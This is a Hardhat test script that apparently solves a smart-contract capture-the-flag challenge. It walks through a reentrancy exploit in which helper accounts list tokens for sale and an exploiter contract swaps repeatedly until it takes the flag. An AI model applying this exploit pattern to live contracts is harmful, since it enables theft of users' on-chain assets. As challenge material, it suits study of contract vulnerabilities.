const { expect } = require('chai');

describe('Game contract', function () {
  let game;
  let deployer;
  let exploiter;
  let attacker;
  let attacker2;
  let attacker3;

  beforeEach(async function () {
    [deployer, attacker, attacker2, attacker3] = await ethers.getSigners();
    const Game = await ethers.getContractFactory('Game');
    game = await Game.deploy();

    const Exploiter = await ethers.getContractFactory(
      'Exploiter',
      attacker.address
    );
    exploiter = await Exploiter.deploy(game.address);

    // check the flag holder is the deployer
    expect(await game.flagHolder()).to.equal(deployer.address);
  });

  it('Exploit', async function () {
    // Please use foundry and not this, I just added hardhat for completeness
    console.log(
      'Please use foundry and not this, I just added hardhat for completeness'
    );

    // The attacker has a second account that will use to join the game just to have Mon to swap with the main account
    await game.connect(attacker2).join();
    await game.connect(attacker2).putUpForSale(3);
    await game.connect(attacker2).putUpForSale(4);
    await game.connect(attacker2).putUpForSale(5);

    // The attacker has a third account that will use to join the game just to have Mon to swap with the main account
    await game.connect(attacker3).join();
    await game.connect(attacker3).putUpForSale(6);
    await game.connect(attacker3).putUpForSale(7);
    await game.connect(attacker3).putUpForSale(8);

    // The attacker contract join the game and put his mon up for sale
    await exploiter.join();
    await exploiter.putUpForSale(9);
    await exploiter.putUpForSale(10);
    await exploiter.putUpForSale(11);

    // The attacker's contract start to swap Mon with the secondary account leveraging the reentrancy issue
    await exploiter.swap(attacker2.address, 9, 3);
    await exploiter.swap(attacker2.address, 3, 4);
    await exploiter.swap(attacker2.address, 4, 5);

    // The secondary account Mon are all dead now so we need to use the third account Mon
    // The attacker's contract start to swap Mon with the third account leveraging the reentrancy issue
    await exploiter.swap(attacker3.address, 5, 6);

    // At this point we won the game because even if we didn't defeat the flag holder Mons
    // we have at the end of the fight more Mons compared to the flag holders
    // see the check `if (balanceOf(attacker) > balanceOf(opponent))`
    // so we get the flag!

    expect(await game.flagHolder()).to.equal(exploiter.address);
  });
});
